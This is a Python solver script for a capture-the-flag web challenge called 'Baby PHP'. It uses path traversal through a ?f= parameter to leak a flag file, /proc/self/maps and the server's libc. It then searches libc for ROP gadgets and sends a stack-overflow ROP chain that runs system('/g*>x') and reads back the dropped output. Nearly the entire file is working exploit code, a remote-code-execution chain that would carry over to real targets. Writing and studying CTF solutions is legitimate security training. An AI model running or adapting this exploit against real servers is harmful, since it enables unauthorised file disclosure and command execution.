#!/usr/bin/env python3
"""
Baby PHP challenge solver.

Flow:
1) Try direct traversal leak: ?f=../../getflag
2) If no flag, leak /proc/self/maps and remote libc via traversal.
3) Build a ROP chain for whale_encrypt stack overflow to execute: system("/g*")
"""

from __future__ import annotations

import argparse
import re
import struct
import sys
import time
from io import BytesIO
from typing import Iterable, Optional, Tuple
from urllib.error import HTTPError, URLError
from urllib.parse import quote, quote_from_bytes
from urllib.request import Request, urlopen

from elftools.elf.elffile import ELFFile

try:
    from capstone import CS_ARCH_X86, CS_MODE_64, Cs

    HAVE_CAPSTONE = True
except Exception:
    HAVE_CAPSTONE = False


FLAG_RE = re.compile(rb"THJCC\{[^}\r\n]+\}")
DROP_FILE = "x"
CMD_TEXT = b"/g*>x"  # shell: run /getflag and redirect output to /app/x


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def normalize_base(url: str) -> str:
    base = url.strip()
    if not base.startswith(("http://", "https://")):
        raise ValueError("Base URL must start with http:// or https://")
    if "?" in base:
        raise ValueError("Base URL must not contain a query string")
    if not base.endswith("/"):
        base += "/"
    return base


def http_get(url: str, timeout: float) -> bytes:
    req = Request(url, headers={"User-Agent": "baby-php-solver/1.0"})
    with urlopen(req, timeout=timeout) as resp:
        return resp.read()


def url_for_f(base: str, path: str) -> str:
    return f"{base}?f={quote(path, safe='')}"


def url_for_txt(base: str, payload: bytes) -> str:
    return f"{base}?txt={quote_from_bytes(payload, safe='')}"


def fetch_f(base: str, path: str, timeout: float) -> bytes:
    return http_get(url_for_f(base, path), timeout=timeout)


def extract_flags(blob: bytes) -> list[str]:
    found = []
    seen = set()
    for m in FLAG_RE.findall(blob):
        s = m.decode("latin1", errors="replace")
        if s not in seen:
            seen.add(s)
            found.append(s)
    return found


def parse_maps(maps_blob: bytes) -> Tuple[Optional[int], Optional[int], Optional[str], str]:
    text = maps_blob.decode("latin1", errors="replace")
    whale_base = None
    libc_base = None
    libc_path = None

    for line in text.splitlines():
        parts = line.split(None, 5)
        if len(parts) < 5:
            continue

        addr_range = parts[0]
        perms = parts[1]
        offset = parts[2]
        path = parts[5].strip() if len(parts) >= 6 else ""
        if " (deleted)" in path:
            path = path.split(" (deleted)", 1)[0]

        if "-" not in addr_range:
            continue
        start_text = addr_range.split("-", 1)[0]
        try:
            start = int(start_text, 16)
        except ValueError:
            continue

        if offset == "00000000" and path.endswith("whalecrypt.so"):
            whale_base = start

        if offset == "00000000" and "libc.so.6" in path and path.startswith("/"):
            # Prefer executable map when available, fallback to first offset-0 mapping.
            if libc_base is None or "x" in perms:
                libc_base = start
                libc_path = path

    return whale_base, libc_base, libc_path, text


def traversal_from_abs(path: str) -> str:
    return "../../" + path.lstrip("/")


def iter_exec_segments(elf: ELFFile) -> Iterable[Tuple[int, bytes]]:
    for seg in elf.iter_segments():
        if seg["p_type"] != "PT_LOAD":
            continue
        if (int(seg["p_flags"]) & 1) == 0:
            continue
        yield int(seg["p_vaddr"]), seg.data()


def find_symbol_offset(elf: ELFFile, name: str) -> Optional[int]:
    for section_name in (".dynsym", ".symtab"):
        sec = elf.get_section_by_name(section_name)
        if sec is None:
            continue
        for sym in sec.iter_symbols():
            sym_name = sym.name
            if sym_name == name or sym_name.startswith(name + "@"):
                value = int(sym["st_value"])
                if value != 0:
                    return value
    return None


def find_bytes_in_exec(elf: ELFFile, pattern: bytes) -> Optional[int]:
    for base, data in iter_exec_segments(elf):
        idx = data.find(pattern)
        if idx != -1:
            return base + idx
    return None


def _parse_mem_operand(text: str) -> tuple[Optional[str], int]:
    """
    Parse memory operand like:
    [rdi], [rdi+8], [rdi+0x8], [rdi-0x10], qword ptr [rdi + 8]
    Returns (base_reg, disp).
    """
    t = text.replace("qword ptr", "").replace(" ", "")
    if not t.startswith("[") or not t.endswith("]"):
        return None, 0
    inner = t[1:-1]
    m = re.match(r"^(r[a-z0-9]+)([+-](?:0x[0-9a-fA-F]+|\d+))?$", inner)
    if not m:
        return None, 0
    base = m.group(1)
    disp_text = m.group(2)
    disp = 0
    if disp_text:
        sign = -1 if disp_text.startswith("-") else 1
        num = disp_text[1:]
        disp = sign * int(num, 0)
    return base, disp


def _find_pop_ret_offsets(elf: ELFFile) -> dict[str, int]:
    out: dict[str, int] = {}
    patterns = {
        "rax": b"\x58\xc3",
        "rcx": b"\x59\xc3",
        "rdx": b"\x5a\xc3",
        "rbx": b"\x5b\xc3",
        "rsp": b"\x5c\xc3",
        "rbp": b"\x5d\xc3",
        "rsi": b"\x5e\xc3",
        "rdi": b"\x5f\xc3",
    }
    for reg, pat in patterns.items():
        off = find_bytes_in_exec(elf, pat)
        if off is not None:
            out[reg] = off
    return out


def find_write_strategy(elf: ELFFile, pop_offsets: dict[str, int]) -> Optional[dict[str, int | str]]:
    """
    Find a generic writer gadget:
      mov qword ptr [BASE + DISP], SRC ; pop* ; ret
    with controllable BASE and SRC via pop gadgets.
    """
    if not HAVE_CAPSTONE:
        return None

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = False

    max_len = 40
    candidates = []

    for seg_base, seg_data in iter_exec_segments(elf):
        seg_len = len(seg_data)
        for i in range(seg_len):
            blob = seg_data[i : i + max_len]
            if not blob:
                continue
            ins = list(md.disasm(blob, seg_base + i))
            if len(ins) < 2:
                continue

            first = ins[0]
            if first.mnemonic != "mov" or "," not in first.op_str:
                continue

            left, right = [x.strip() for x in first.op_str.split(",", 1)]
            base_reg, disp = _parse_mem_operand(left)
            src_reg = right.replace(" ", "")
            if base_reg is None:
                continue
            if src_reg not in pop_offsets:
                continue
            if base_reg not in pop_offsets:
                continue

            pop_count = 0
            ok = False
            for j in range(1, min(8, len(ins))):
                cur = ins[j]
                if cur.mnemonic == "ret":
                    ok = True
                    break
                if cur.mnemonic == "pop":
                    pop_count += 1
                    continue
                break
            if not ok:
                continue

            score = (
                0 if base_reg == "rdi" else 1,
                0 if src_reg == "rax" else 1,
                abs(disp),
                pop_count,
            )
            candidates.append(
                (
                    score,
                    {
                        "gadget_off": seg_base + i,
                        "base_reg": base_reg,
                        "src_reg": src_reg,
                        "disp": disp,
                        "pop_count": pop_count,
                    },
                )
            )

    if not candidates:
        return None

    candidates.sort(key=lambda x: x[0])
    return candidates[0][1]


def analyze_libc(libc_blob: bytes) -> dict[str, int | str]:
    elf = ELFFile(BytesIO(libc_blob))

    system_off = find_symbol_offset(elf, "system")
    exit_off = find_symbol_offset(elf, "exit") or find_symbol_offset(elf, "_exit")
    pop_offsets = _find_pop_ret_offsets(elf)
    pop_rdi_off = pop_offsets.get("rdi")
    write_strategy = find_write_strategy(elf, pop_offsets)

    if system_off is None:
        raise RuntimeError("Could not resolve system offset from remote libc")
    if exit_off is None:
        raise RuntimeError("Could not resolve exit/_exit offset from remote libc")
    if pop_rdi_off is None:
        raise RuntimeError("Could not find 'pop rdi ; ret' gadget in remote libc")
    if write_strategy is None:
        raise RuntimeError("Could not find a compatible memory-write gadget in remote libc")

    src_reg = str(write_strategy["src_reg"])
    base_reg = str(write_strategy["base_reg"])
    if base_reg == src_reg:
        raise RuntimeError("Selected write gadget uses identical base/src register and is not controllable")
    if src_reg not in pop_offsets:
        raise RuntimeError(f"Could not find 'pop {src_reg} ; ret' for selected write gadget")
    if base_reg not in pop_offsets:
        raise RuntimeError(f"Could not find 'pop {base_reg} ; ret' for selected write gadget")

    return {
        "system_off": system_off,
        "exit_off": exit_off,
        "pop_rdi_off": pop_rdi_off,
        "pop_base_off": pop_offsets[base_reg],
        "pop_src_off": pop_offsets[src_reg],
        "write_off": int(write_strategy["gadget_off"]),
        "write_base_reg": base_reg,
        "write_src_reg": src_reg,
        "write_disp": int(write_strategy["disp"]),
        "write_pop_count": int(write_strategy["pop_count"]),
        "ret_off": pop_rdi_off + 1,  # c3 byte in pop-rdi-ret gadget
    }


def build_overflow_payload(
    whale_base: int,
    libc_base: int,
    gadgets: dict[str, int | str],
    add_align_ret: bool,
) -> bytes:
    writable = whale_base + 0x40F0
    pop_rdi = libc_base + int(gadgets["pop_rdi_off"])
    pop_base = libc_base + int(gadgets["pop_base_off"])
    pop_src = libc_base + int(gadgets["pop_src_off"])
    write_gadget = libc_base + int(gadgets["write_off"])
    write_disp = int(gadgets["write_disp"])
    ret = libc_base + gadgets["ret_off"]
    system = libc_base + gadgets["system_off"]
    exit_fn = libc_base + int(gadgets["exit_off"])

    payload = bytearray()
    payload += b"A" * 0x40
    payload += p64(0)  # overwrite [rbp-0x70] length to 0
    payload += b"B" * (0xB8 - len(payload))

    chain = []

    cmd_bytes = CMD_TEXT + b"\x00"
    for off in range(0, len(cmd_bytes), 8):
        chunk = cmd_bytes[off : off + 8].ljust(8, b"\x00")
        value = int.from_bytes(chunk, "little")
        # For: mov [BASE + DISP], SRC ; ... ; ret
        target = writable + off
        write_base_value = (target - write_disp) & 0xFFFFFFFFFFFFFFFF
        chain += [pop_base, write_base_value, pop_src, value, write_gadget]
        chain += [0x4444444444444444] * int(gadgets["write_pop_count"])

    chain += [pop_rdi, writable]
    if add_align_ret:
        chain.append(ret)
    chain.append(system)
    # End chain cleanly to avoid returning into random stack data.
    chain += [pop_rdi, 0, exit_fn]

    for q in chain:
        payload += p64(q)

    return bytes(payload)


def ensure_surface(base: str, timeout: float) -> None:
    data = fetch_f(base, "index.php", timeout)
    if b"whale_encrypt" not in data:
        raise RuntimeError("Traversal check failed: index.php did not contain expected content")


def run(base: str, timeout: float, attempts: int, sleep_s: float, verbose: bool) -> int:
    print(f"[+] Target: {base}")

    ensure_surface(base, timeout)
    print("[+] Surface check passed (?f=index.php)")

    direct = fetch_f(base, "../../getflag", timeout)
    direct_flags = extract_flags(direct)
    if direct_flags:
        print("[+] Direct leak succeeded.")
        for f in direct_flags:
            print(f"FLAG: {f}")
        return 0
    print("[-] Direct leak did not expose a THJCC{...} flag string.")

    maps_blob = fetch_f(base, "../../proc/self/maps", timeout)
    whale_base, libc_base, libc_path, maps_text = parse_maps(maps_blob)
    if whale_base is None:
        raise RuntimeError("Could not parse whalecrypt.so base from /proc/self/maps")
    if libc_base is None or libc_path is None:
        raise RuntimeError("Could not parse libc base/path from /proc/self/maps")

    print(f"[+] whalecrypt base: {hex(whale_base)}")
    print(f"[+] libc base:      {hex(libc_base)}")
    print(f"[+] libc path:      {libc_path}")

    if verbose:
        print("[v] maps sample:")
        print("\n".join(maps_text.splitlines()[:20]))

    libc_traversal = traversal_from_abs(libc_path)
    libc_blob = fetch_f(base, libc_traversal, timeout)
    if len(libc_blob) < 1024 * 1024:
        raise RuntimeError(
            f"Remote libc leak looks too small ({len(libc_blob)} bytes), traversal may be blocked"
        )
    print(f"[+] Downloaded remote libc: {len(libc_blob)} bytes")

    gadgets = analyze_libc(libc_blob)
    print("[+] Resolved libc offsets:")
    print(f"    system:    {hex(gadgets['system_off'])}")
    print(f"    exit:      {hex(gadgets['exit_off'])}")
    print(f"    pop rdi:   {hex(gadgets['pop_rdi_off'])}")
    print(
        f"    writer:    {hex(gadgets['write_off'])} "
        f"(base={gadgets['write_base_reg']} src={gadgets['write_src_reg']} "
        f"disp={gadgets['write_disp']} extra_pops={gadgets['write_pop_count']})"
    )

    for attempt in range(1, attempts + 1):
        print(f"[+] ROP attempt {attempt}/{attempts}")
        for align in (False, True):
            payload = build_overflow_payload(
                whale_base=whale_base,
                libc_base=libc_base,
                gadgets=gadgets,
                add_align_ret=align,
            )
            mode = "with-ret-align" if align else "no-align-ret"
            print(f"[+] Sending txt payload ({mode}), len={len(payload)}")
            try:
                response = http_get(url_for_txt(base, payload), timeout)
            except (HTTPError, URLError, TimeoutError, ConnectionError) as e:
                if verbose:
                    print(f"[v] payload request error (expected on crash/exit): {e}")
                response = b""

            flags = extract_flags(response)
            if flags:
                print("[+] Exploit succeeded from direct response.")
                for f in flags:
                    print(f"FLAG: {f}")
                return 0

            # Preferred exfil path: command redirects output to /app/x, then we read it.
            try:
                dropped = fetch_f(base, DROP_FILE, timeout)
                file_flags = extract_flags(dropped)
                if file_flags:
                    print(f"[+] Exploit succeeded via dropped file '/app/{DROP_FILE}'.")
                    for f in file_flags:
                        print(f"FLAG: {f}")
                    return 0
            except Exception:
                pass

        if attempt != attempts:
            time.sleep(sleep_s)
            # Re-sync maps/bases between attempts in case process restarted.
            maps_blob = fetch_f(base, "../../proc/self/maps", timeout)
            whale_base, libc_base, libc_path, _ = parse_maps(maps_blob)
            if whale_base is None or libc_base is None:
                raise RuntimeError("Failed to refresh maps after failed attempt")

    print("[-] No flag found after all attempts.")
    return 1


def main() -> int:
    parser = argparse.ArgumentParser(description="Baby PHP challenge solver")
    parser.add_argument(
        "--url",
        default="http://chal-gcp.thjcc.org:60030/",
        help="Challenge base URL",
    )
    parser.add_argument("--timeout", type=float, default=12.0, help="HTTP timeout seconds")
    parser.add_argument("--attempts", type=int, default=2, help="Number of exploit attempts")
    parser.add_argument("--sleep", type=float, default=0.75, help="Sleep between attempts")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    try:
        base = normalize_base(args.url)
        return run(
            base=base,
            timeout=args.timeout,
            attempts=max(1, args.attempts),
            sleep_s=max(0.0, args.sleep),
            verbose=args.verbose,
        )
    except (HTTPError, URLError, TimeoutError, ConnectionError) as e:
        print(f"[!] Network error: {e}", file=sys.stderr)
        return 2
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        return 3


if __name__ == "__main__":
    sys.exit(main())
